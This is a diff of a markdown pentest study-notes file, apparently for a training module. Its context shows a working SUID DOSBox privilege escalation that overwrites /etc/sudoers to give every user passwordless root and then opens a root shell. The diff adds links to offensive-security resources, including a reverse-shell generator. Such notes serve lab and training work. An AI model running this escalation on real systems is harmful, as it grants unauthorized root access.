@@ -178,3 +178,10 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 
 ### "dosbox is SUID root — how do I exploit it?"
 → DOSBox is a DOS emulator. Its `-c` flag runs DOS commands at startup as the effective user (root, since SUID). Use `mount` to map a Linux directory to a DOS drive, then `echo` with redirection to write files as root: `dosbox -c 'mount c /etc' -c 'echo USER ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`. ALSA errors are normal (no sound card) — ignore them. Then `sudo -n bash`. Restore sudoers after: `bsdtar -xOf /path/to/sudo-pkg.tar.zst etc/sudoers > /etc/sudoers`. See [[PrivEsc Linux - SUID]].
+## External Resources
+
+- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
+- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
+- [RevShells](https://www.revshells.com/) for reverse-shell selection
+- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
+- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
